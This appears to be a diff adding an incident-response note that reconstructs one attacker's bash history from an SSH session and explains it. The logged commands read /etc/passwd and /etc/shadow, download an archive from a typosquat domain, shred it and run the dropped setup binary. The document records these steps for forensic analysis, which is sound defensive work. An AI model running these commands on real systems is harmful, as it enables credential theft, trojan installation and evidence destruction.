@@ -1,0 +1,22 @@
+Attacker command block — bash_history.txt (2024-02-19 04:00-04:14)
+==================================================================
+[2024-02-19 04:00:18] whoami
+[2024-02-19 04:00:20] uname -a
+[2024-02-19 04:00:40] cat /etc/passwd
+[2024-02-19 04:01:01] cat /etc/shadow
+[2024-02-19 04:01:15] ps faux
+[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
+[2024-02-19 04:10:02] tar xvf latest.tar.gz
+[2024-02-19 04:12:02] shred -zu latest.tar.gz
+[2024-02-19 04:14:02] ./setup
+
+Analysis:
+- Starts 4 seconds after the SSH session from 2.67.182.119 was accepted
+  (04:00:14) -> same session.
+- Recon: whoami/uname/cat /etc/passwd + /etc/shadow/ps faux.
+- Supply-chain style download from gnu-packages.com (typosquat of gnu.org),
+  fake "prebuilt iproute2"; archive then shredded (-zu) to destroy evidence
+  and ./setup executed (trojan drop).
+- This is the ONLY malicious block in the whole history; all other entries
+  are legit dev work (venv, pip, server.py, git, nvim) matching the other
+  softdev sessions.
